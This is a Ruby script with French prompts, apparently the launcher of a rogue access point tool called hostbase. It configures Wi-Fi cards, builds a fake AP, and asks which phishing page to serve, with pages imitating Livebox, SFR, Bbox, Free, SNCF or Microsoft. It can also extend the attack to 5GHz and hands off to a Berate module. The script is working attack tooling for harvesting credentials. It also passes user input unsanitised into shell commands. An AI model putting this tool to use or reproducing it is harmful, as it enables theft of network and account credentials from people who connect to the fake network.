#!/usr/bin/env ruby


require 'open3'
require 'highline/import'
require './berate'

def error
puts "\e[1;31m[*] ERREUR détectée: vérifiez vos entrées: sortie du programme dans 5s.\e[0m"
sleep 5
abort("BYE..")
end

File.open("scancarte.txt").readlines.each do |scancarte|
   puts scancarte
$scancarte = scancarte.chomp
end

`ip link set #{$scancarte} down`
`iw dev #{$scancarte} set type managed`
`ip link set #{$scancarte} up`

puts "\e[1;33m[*] Cartes disponibles:\e[0m"
system"airmon-ng"
puts "Entrez une carte wifi pour créer votre fake AP: "
$carte = gets.chomp
puts "#{$carte} a été sélectionnée pour créer votre fake AP"
if $carte.chomp.start_with?('wlan', 'wlx', 'wlp')
  `echo #{$carte} > carte.txt`
   puts "\e[1;32m[*] Vérification de l'interface wifi... OK.\e[0m"
else
`rm -rf *.txt`
`rm -rf /tmp/hostbase-1.6FR`
error()
end


puts "Entrez la page de phishing a utiliser: "
$page = gets.chomp
puts "#{$page} a été sélectionné comme page de phishing de votre fake AP"
if $page.chomp.start_with?('liveboxwp', 'sfrwp', 'bboxwp', 'freewp', '404', 'sncf', 'microsoft')
`echo #{$page} > page.txt`
   puts "\e[1;32m[*] Page de phishing... OK.\e[0m"
else
`rm -rf *.txt`
`rm -rf /tmp/hostbase-1.6FR`
error()
end


if File.read('carte.txt').include?('wlan0')
  `echo wlan1 > cartedos.txt`
else
  `echo wlan0 > cartedos.txt`
end 

puts "\e[1;94m[*] Voulez-vous attaquez le réseau ciblé aussi sur les fréquences 5GHz ?: oui,non (nécessite une 3e carte wifi dont une carte wifi compatible 5GHz): \e[0m"
  choix = gets.chomp
  case choix

  when 'oui'
  load 'scan5g.rb'
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
end
`ip link set #{$cartef} down`
`iw dev #{$cartef} set type managed`
`ip link set #{$cartef} up`
load 'interface2g.rb'
puts"Vérification du réseau sélectionné..."
load 'compare.rb'


  `cp -R $(pwd) *.txt /tmp/hostbase-1.6FR`
  puts "Berate"
  Berate.berateNormal
  when 'non'
    puts "Vous avez choisi d'attaquer le réseau ciblé uniquement sur les fréquences 2.4GHz"
    `cp -R $(pwd) *.txt /tmp/hostbase-1.6FR`
    puts"Berate"# on balance berate 
    Berate.berateNormal
    else
    puts "\e[1;31m[*] ERREUR: merci de sélectionner une option correcte (oui,non) !\e[0m"
    `rm -rf *.txt`
    `rm -rf /tmp/hostbase-1.6FR`
    error()
end
